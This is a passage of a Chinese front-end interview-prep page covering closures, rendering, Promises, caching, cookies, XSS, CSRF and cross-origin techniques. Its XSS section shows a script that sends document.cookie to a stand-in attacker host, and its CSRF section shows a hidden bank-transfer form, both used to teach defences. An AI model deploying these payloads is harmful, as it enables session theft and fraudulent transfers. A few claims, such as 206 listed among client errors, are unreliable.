能够读取其他函数内部变量的函数，就是闭包：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
　　　　<span class="token keyword">var</span> n<span class="token operator">=</span><span class="token number">999</span><span class="token punctuation">;</span>
　　　　<span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
　　　　　　console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span> 
　　　　<span class="token punctuation">}</span>
　　　　<span class="token keyword">return</span> f2<span class="token punctuation">;</span>
　　<span class="token punctuation">}</span>
　　<span class="token keyword">var</span> result<span class="token operator">=</span><span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">　　result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 999</span>
</code></pre></div><p>上面的代码中，把f2作为返回值，就可以在f1外部读取它的内部变量。
在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p> <p><strong>闭包的用途：</strong></p> <p>1.从外部读取函数内部的变量:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
　　　　<span class="token keyword">var</span> n<span class="token operator">=</span><span class="token number">666</span><span class="token punctuation">;</span>
　　　　<span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
　　　　        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>  
　　　　<span class="token punctuation">}</span>
　　　　<span class="token keyword">return</span> f2<span class="token punctuation">;</span>
　　<span class="token punctuation">}</span>
　　<span class="token keyword">var</span> result<span class="token operator">=</span><span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">　　result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 666</span>
</code></pre></div><p>2.将创建的变量的值始终保持在内存中:</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">12</span><span class="token punctuation">;</span>
      <span class="token keyword">function</span> <span class="token function">f2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
           console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token operator">++</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> f2<span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
<span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//13</span>
</code></pre></div><p>上面代码中，函数f1中的局部变量n一直保存在内存中，并没有在f1调用后被自动清除。</p> <p>3.封装对象的私有属性和私有方法。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">function</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token parameter">n</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">return</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">return</span> n<span class="token operator">++</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token keyword">var</span> a1 <span class="token operator">=</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 1</span>
<span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 2</span>
<span class="token function">a1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 3</span>
<span class="token keyword">var</span> a2 <span class="token operator">=</span> <span class="token function">f1</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">a2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 5</span>
<span class="token function">a2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 6</span>
<span class="token function">a2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">// 7</span>
<span class="token comment">//这段代码中，a1 和 a2 是相互独立的，各自返回自己的私有变量。</span>
</code></pre></div><h2 id="for-in-和for-of"><a href="#for-in-和for-of" class="header-anchor">#</a> for in 和for of</h2> <p>for...in 循环主要是为了遍历对象而生，不适用于遍历数组</p> <p>for...of 循环可以用来遍历数组、类数组对象，字符串、Set、Map 以及 Generator 对象</p> <h2 id="浏览器渲染机制是怎样的-什么是重排-回流-重绘"><a href="#浏览器渲染机制是怎样的-什么是重排-回流-重绘" class="header-anchor">#</a> 浏览器渲染机制是怎样的，什么是重排（回流），重绘</h2> <p>1.解析HTML，构建DOM树</p> <p>2.解析CSS，生成CSS规则树</p> <p>3.合并dom树和css树，生成render树</p> <p>4.布局render树</p> <p>5.绘制render树，即绘制页面像素信息</p> <p>6.GPU将各层合成，结果呈现在浏览器窗口中</p> <p>重排：几何属性更改（宽高、位置）</p> <p>重绘：样式更新（背景色、颜色）</p> <p>一旦渲染树构建完成，就要开始绘制（paint）页面元素了。当DOM的变化引发了元素几何属性的变化，比如改变元素的宽高，元素的位置，导致浏览器不得不重新计算元素的几何属性，并重新构建渲染树，这个过程称为“重排”。完成重排后，要将重新构建的渲染树渲染到屏幕上，这个过程就是“重绘”。简单的说，重排负责元素的几何属性更新，重绘负责元素的样式更新。而且，重排必然带来重绘，但是重绘未必带来重排。比如，改变某个元素的背景，这个就不涉及元素的几何属性，所以只发生重绘。</p> <h3 id="永久性重定向-301-和临时性重定向-302-对-seo-有什么影响-喜马拉雅"><a href="#永久性重定向-301-和临时性重定向-302-对-seo-有什么影响-喜马拉雅" class="header-anchor">#</a> 永久性重定向（301）和临时性重定向（302）对 SEO 有什么影响（喜马拉雅）</h3> <p>1）301 redirect——301代表永久性转移(Permanently Moved)，301重定向是网页更改地址后对搜索引擎友好的最好方法，只要不是暂时搬移的情况,都建议使用301来做转址。
如果我们把一个地址采用301跳转方式跳转的话，搜索引擎会把老地址的PageRank等信息带到新地址，同时在搜索引擎索引库中彻底废弃掉原先的老地址。旧网址的排名等完全清零。</p> <p>2）302 redirect——302代表暂时性转移(Temporarily Moved )，在前些年，不少Black Hat SEO曾广泛应用这项技术作弊，目前，各大主要搜索引擎均加强了打击力度，象Google前些年对Business.com以及近来对BMW德国网站的惩罚。即使网站客观上不是spam，也很容易被搜寻引擎容易误判为spam而遭到惩罚。</p> <h3 id="promise有哪些状态-有哪些方法-它的执行机制是怎样的-百度-喜马拉雅"><a href="#promise有哪些状态-有哪些方法-它的执行机制是怎样的-百度-喜马拉雅" class="header-anchor">#</a> promise有哪些状态，有哪些方法, 它的执行机制是怎样的？（百度，喜马拉雅）</h3> <p>状态：</p> <ul><li>待定（pending）*: 初始状态，既没有被兑现，也没有被拒绝。</li> <li><em>已兑现（fulfilled）</em>: 意味着操作成功完成。</li> <li><em>已拒绝（rejected）</em>: 意味着操作失败。</li></ul> <p>方法：</p> <p>静态方法</p> <p>all、allSettled、any、race、reject、resolve</p> <p>原型方法</p> <p>catch、then、finally</p> <p>执行机制：</p> <p>Promise实例其实就是一串执行链（回调函数的List），不同回调函数用then()方法连接。</p> <p>每个回调函数是执行链上的一个节点。并且每个回调函数内有一致的上下文。</p> <p>在回到函数内，通过 resolve(obj) 与 reject(obj) 把执行权指向下一个链条中的回调。并且下一次回调的入参。</p> <h3 id="常用的状态码有哪些-都代表什么-百度-喜马拉雅"><a href="#常用的状态码有哪些-都代表什么-百度-喜马拉雅" class="header-anchor">#</a> 常用的状态码有哪些，都代表什么（百度，喜马拉雅）</h3> <p>1 请求已接收，继续处理</p> <p>2 成功</p> <p>3 重定向，需要进一步处理</p> <p>4 客户端错误 206是内容协商(range)</p> <p>5 服务器错误</p> <h3 id="强缓存和协商缓存"><a href="#强缓存和协商缓存" class="header-anchor">#</a> 强缓存和协商缓存</h3> <p>强缓存是服务器在响应头里直接规定缓存的规则</p> <p>协商缓存是请求头会传tag和最近修改时间然后服务器再看是否发生了变化</p> <h3 id="vue项目的优化"><a href="#vue项目的优化" class="header-anchor">#</a> Vue项目的优化</h3> <ul><li>Vue 代码层面的优化；</li> <li>webpack 配置层面的优化；</li> <li>基础的 Web 技术层面的优化。</li></ul> <h2 id="i-和-i的区别"><a href="#i-和-i的区别" class="header-anchor">#</a> i++和++i的区别</h2> <p>i ++ 是先赋值后加；++ i 是先加后赋值</p> <h2 id="json实现深拷贝有什么缺点"><a href="#json实现深拷贝有什么缺点" class="header-anchor">#</a> JSON实现深拷贝有什么缺点</h2> <p>喜马拉雅面试题</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">)</span>
</code></pre></div><ol><li>如果obj里面有时间对象，序列化之后的结果，时间将只是字符串的形式，而不是对象的形式</li> <li>如果obj里有RegExp（正则）、Error对象，则序列化的结果将只是空对象</li> <li>如果obj里有函数，则序列化的结果会把函数丢失</li> <li>如果obj里有NaN，Infinity和-Infinity，则序列化的结果会变成null</li> <li>只能序列化对象的可枚举的自有属性。例如，如果obj中的对象有的是由构造函数生成的，则序列化后会丢失对象的constructor属性</li> <li>如果对象中存在循环引用的情况也无法正确实现深拷贝</li></ol> <h2 id="settimeout和setinterval都用来实现轮询的区别"><a href="#settimeout和setinterval都用来实现轮询的区别" class="header-anchor">#</a> setTimeout和setInterval都用来实现轮询的区别</h2> <p>喜马拉雅面试题</p> <p>如果使用一个轮询，就适合使用setTimeout来模拟。</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> timer<span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">loop</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token comment">//成功，调用回调</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>code <span class="token operator">===</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">clearTimeout</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
      timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token punctuation">{</span>
      timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>loop<span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
timer <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span>loop<span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>使用setInterval是这样的：</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">var</span> timer<span class="token punctuation">;</span>
<span class="token keyword">var</span> <span class="token function-variable function">loop</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
  $<span class="token punctuation">.</span><span class="token function">ajax</span><span class="token punctuation">(</span>action<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span><span class="token operator">=&gt;</span><span class="token punctuation">{</span>
    <span class="token comment">//成功，调用回调</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>code <span class="token operator">===</span><span class="token string">'success'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
      <span class="token function">clearInterval</span><span class="token punctuation">(</span>timer<span class="token punctuation">)</span><span class="token punctuation">;</span>
      timer <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
  <span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token punctuation">}</span>
timer <span class="token operator">=</span> <span class="token function">setInterval</span><span class="token punctuation">(</span>loop<span class="token punctuation">,</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre></div><p>因为去后台请求数据需要时间，而如果这个响应时间大于我们定时器的时间间隔，<code>setInterval</code>就会产生多次发送请求的bug。但是，我们可以利用<code>setTimeout</code>只执行一次的语法特性，来将它安排在异步回调中。这样就不会产生这种bug了。</p> <h2 id="事件委托"><a href="#事件委托" class="header-anchor">#</a> 事件委托</h2> <p>喜马拉雅、科大讯飞面试题</p> <p>如果我们有许多以类似方式处理的元素，那么就不必为每个元素分配一个处理程序 —— 而是将单个处理程序放在它们的共同祖先上。</p> <p>在处理程序中，我们获取 <code>event.target</code> 以查看事件实际发生的位置并进行处理。</p> <p>在 <strong>document.addEventListener</strong> 的时候我们可以<strong>设置事件模型</strong>：事件冒泡、事件捕获，一般来说都是用事件冒泡的模型；</p> <p><img src="/assets/img/event.6b796d7d.png" alt="Image"></p> <p>上图所示，事件模型是指分为三个阶段：</p> <p>捕获阶段：在事件冒泡的模型中，捕获阶段不会响应任何事件； 目标阶段：目标阶段就是指事件响应到触发事件的最底层元素上； 冒泡阶段：冒泡阶段就是事件的触发响应会从最底层目标一层层地向外到最外层（根节点），事件代理即是利用事件冒泡的机制把里层所需要响应的事件绑定到外层。</p> <p>优点：</p> <p>事件委托可以减少大量的内存消耗，节约效率。</p> <p>缺点：</p> <p>focus、blur 之类的事件本身没有事件冒泡机制，所以无法委托； mousemove、mouseout这样的事件，虽然有事件冒泡，但是只能不断通过位置去计算定位，对性能消耗高，不适合事件委托。</p> <h2 id="xss攻击"><a href="#xss攻击" class="header-anchor">#</a> XSS攻击</h2> <p>Cookie的常用属性：</p> <ul><li><p>Secure：只允许 Cookie 在 HTTPS 请求中被使用</p></li> <li><p>HttpOnly：禁止使用 JS 访问 cookie（ducoment.cookie 访问被禁止了）</p></li></ul> <p>Cookie 只允许储存 4kb 的数据。</p> <p>比如你在水一个论坛，这个论坛有个 bug：不会对发布内容中的 HTML 标签进行过滤</p> <p>某一天，一个恶意用户发了个帖子，内容如下：</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;atacker.com?cookie=&quot;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span> 
</code></pre></div><p>当你访问这条帖子的内容时，浏览器就会执行 <code>&lt;script&gt;</code> 中的代码，导致你的 Cookie 被发送给攻击者，接着攻击者就可以利用你的 Cookie 登录论坛，然后为所欲为了</p> <p>XSS 攻击在很多情况下，用户甚至不会知道自己被攻击了，比如利用 <code>&lt;img/&gt;</code> 的 <code>src</code> 属性，就可以做到悄无声息的把用户的信息发给攻击者。</p> <p>而当设置了 <code>HttpOnly</code> 后，<code>ducoment.cookie</code> 将获取不到 Cookie，攻击者的代码自然就无法生效了。</p> <h2 id="csrf攻击"><a href="#csrf攻击" class="header-anchor">#</a> CSRF攻击</h2> <p>假设你在浏览器中登录过某个银行 <code>bank.com</code>，这个银行系统使用 Cookie 来保存你的登录态</p> <p>接着你访问了一个恶意网站，该网站中有一个表单：</p> <div class="language-html extra-class"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>bank.com/transfer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>post<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>amount<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>100000.00<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>target<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>attacker<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>屠龙宝刀，点击就送!<span class="token punctuation">&quot;</span></span><span class="token punctuation">/&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>

</code></pre></div><p>假设 <code>bank.com/transfer</code> 是用来转账的接口。</p> <p>当你被诱导点下了提交按钮后：</p> <ol><li>由于 form 表单提交是可以跨域的，你将会对 <code>bank.com/transfer</code> 发起一次 POST 请求</li> <li>由于此前你已经登录过 <code>bank.com</code>，浏览器会自动将你的 Cookie 一并发送过去（即使你当前并未处于银行系统的页面）</li> <li><code>bank.com</code> 收到你的带 Cookie 的请求后，认为你是正常登录了的，导致转账成功进行</li> <li>最终你损失了一大笔钱</li></ol> <p>即使用 Cookie 配合 HTTPS 请求，CSRF 攻击也无法被避免，因为 HTTPS 请求只是对传输的数据进行了加密，而 CSRF 攻击的特点是，诱导你去访问某个需要你的权限的接口，HTTPS 并不能阻止这种访问。</p> <p>CSRF 攻击的核心，就是利用了<strong>浏览器会自动在所有请求里带上 Cookie</strong> 的特性。</p> <h4 id="localstorage"><a href="#localstorage" class="header-anchor">#</a> LocalStorage</h4> <p>SessionStorage 和 LocalStorage 使用方法基本一致，唯一不同的是，一旦关闭页面，SessionStorage 将会删除数据。</p> <p>因此，LocalStorage 比较常见的一个替代 Cookie 的场景就是登录态的保持，比如用 token 的方法加上 HTTPS 请求，就可以很大程度上提高登录的安全性，避免被 CSRF 攻击（但是依然无法完全避免被 XSS 攻击的风险）。</p> <p>大概工作流程就是，用户登录后，从服务器拿到一个 token，然后存进 LocalStorage 里，之后每次请求前都从 LocalStorage 里取出 token，放到请求数据里，服务器就能知道是同一个用户在发起请求了；由于 HTTPS 的存在，也不用担心 token 会被泄露给第三方，因此是很安全的。</p> <h4 id="localstorage-的缺点"><a href="#localstorage-的缺点" class="header-anchor">#</a> LocalStorage 的缺点</h4> <ol><li><p>无法像 Cookie 一样设置过期时间</p></li> <li><p>只能存入字符串，无法直接存对象</p></li></ol> <p>使用JSON.stringify() 无法正确转换 JS 的部分属性</p> <ul><li><p>undefiend</p></li> <li><p>Function</p></li> <li><p>RegExp（正则表达式，转换后变成了空对象）</p></li> <li><p>Date（转换后变成了字符串，而非 Date 类的对象）</p></li> <li><p>无法转换循环引用的对象</p> <div class="language-js extra-class"><pre class="language-js"><code><span class="token keyword">const</span> a <span class="token operator">=</span> <span class="token punctuation">{</span> key<span class="token operator">:</span> <span class="token string">'value'</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
a<span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">=</span> a<span class="token punctuation">;</span>
<span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">// Uncaught TypeError: Converting circular structure to JSON</span>
<span class="token comment">//     --&gt; starting at object with constructor 'Object'</span>
<span class="token comment">//     --- property 'a' closes the circle</span>
<span class="token comment">//     at JSON.stringify (&lt;anonymous&gt;)</span>

</code></pre></div></li></ul> <p>在大部分应用场景下，LocalStorage 已经能完全替代 Cookie，只有类似于广告这种场景，由于 Cookie 可以被服务端设置，Cookie 仍存在不可替代的价值。</p> <h2 id="跨域的解决办法"><a href="#跨域的解决办法" class="header-anchor">#</a> 跨域的解决办法</h2> <p>浏览器的同源策略：同源策略限制了从同一个源加载的文档或脚本如何与来自另一个源的资源进行交互。这是一个用于隔离潜在恶意文件的重要安全机制。</p> <p>同源策略下请求跨域接口的解决办法：</p> <ol><li>JSONP</li></ol> <p>HTML标签的script、img、iframe这样的获取资源的元素没有跨域限制。</p> <div class="language-js extra-class"><pre class="language-js"><code>  <span class="token keyword">const</span> script <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span>
    <span class="token comment">// 接口返回的数据获取</span>
    window<span class="token punctuation">.</span><span class="token function-variable function">jsonpCb</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">res</span><span class="token punctuation">)</span> <span class="token operator">=&gt;</span> <span class="token punctuation">{</span>
      document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span>
      <span class="token keyword">delete</span> window<span class="token punctuation">.</span>jsonpCb
      <span class="token function">resolve</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token punctuation">}</span>
   script<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">?&amp;cb=jsonpCb</span><span class="token template-punctuation string">`</span></span>
   document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>script<span class="token punctuation">)</span>
</code></pre></div><ol start="2"><li>空iframe加form</li></ol> <p>JSONP只能发GET请求，因为script加载资源就是GET。如何发送POST请求呢？</p> <div class="language-js extra-class"><pre class="language-js"><code> <span class="token keyword">const</span> iframe <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'iframe'</span><span class="token punctuation">)</span>
  iframe<span class="token punctuation">.</span>name <span class="token operator">=</span> <span class="token string">'iframePost'</span>
  iframe<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>iframe<span class="token punctuation">)</span>
  <span class="token keyword">const</span> form <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'form'</span><span class="token punctuation">)</span>
  <span class="token keyword">const</span> node <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'input'</span><span class="token punctuation">)</span>
  form<span class="token punctuation">.</span>action <span class="token operator">=</span> url
  form<span class="token punctuation">.</span>target <span class="token operator">=</span> iframe<span class="token punctuation">.</span>name
  form<span class="token punctuation">.</span>method <span class="token operator">=</span> <span class="token string">'post'</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> name <span class="token keyword">in</span> data<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    node<span class="token punctuation">.</span>name <span class="token operator">=</span> name
    node<span class="token punctuation">.</span>value <span class="token operator">=</span> data<span class="token punctuation">[</span>name<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    form<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">cloneNode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  <span class="token punctuation">}</span>
  form<span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>
  form<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  document<span class="token punctuation">.</span>body<span class="token punctuation">.</span><span class="token function">removeChild</span><span class="token punctuation">(</span>form<span class="token punctuation">)</span>
</code></pre></div><ol start="3"><li>CORS</li></ol> <p>CORS是一个W3C标准，全称是&quot;跨域资源共享&quot;。这是处理跨域问题的标准做法。CORS有两种请求，简单请求和非简单请求。</p> <p>对于简单请求，后端设置：</p> <div class="language-js extra-class"><pre class="language-js"><code> ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">)</span>
</code></pre></div><p>非简单请求：</p> <p>非简单请求会发出一次预检测请求，返回码是204，预检测通过才会真正发出请求，这才返回200。</p> <p>如果需要 http请求带上cookie，需要前后端都设置Credentials，且后端设置指定的origin。</p> <p>非简单请求会增加一次preflight请求。所以除了设置origin，还需要设置Access-Control-Request-Method和Access-Control-Request-Headers。</p> <div class="language-js extra-class"><pre class="language-js"><code>  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Origin'</span><span class="token punctuation">,</span>  <span class="token string">'http://localhost:9099'</span><span class="token punctuation">)</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Credentials'</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Request-Method'</span><span class="token punctuation">,</span> <span class="token string">'PUT,POST,GET,DELETE,OPTIONS'</span><span class="token punctuation">)</span>
  ctx<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Access-Control-Allow-Headers'</span><span class="token punctuation">,</span> <span class="token string">'Origin, X-Requested-With, Content-Type, Accept, t'</span><span class="token punctuation">)</span>
</code></pre></div><ol start="4"><li><p>代理</p> <p>使用服务端代理发送请求。请求的时候还是用前端的域名，然后代理帮我们把这个请求转发到真正的后端域名上。</p> <p>比如nginx代理：</p> <div class="language-js extra-class"><pre class="language-js"><code>server<span class="token punctuation">{</span>
    <span class="token comment">// 监听9099端口</span>
    listen <span class="token number">9099</span><span class="token punctuation">;</span>
    <span class="token comment">// 域名是localhost</span>
    server_name localhost<span class="token punctuation">;</span>
    <span class="token comment">// 凡是localhost:9099/api这个样子的，都转发到真正的服务端地址    http://localhost:9871 </span>
    location <span class="token operator">^</span><span class="token operator">~</span> <span class="token operator">/</span>api <span class="token punctuation">{</span>
        proxy_pass http<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>localhost<span class="token operator">:</span><span class="token number">9871</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>    
<span class="token punctuation">}</span>
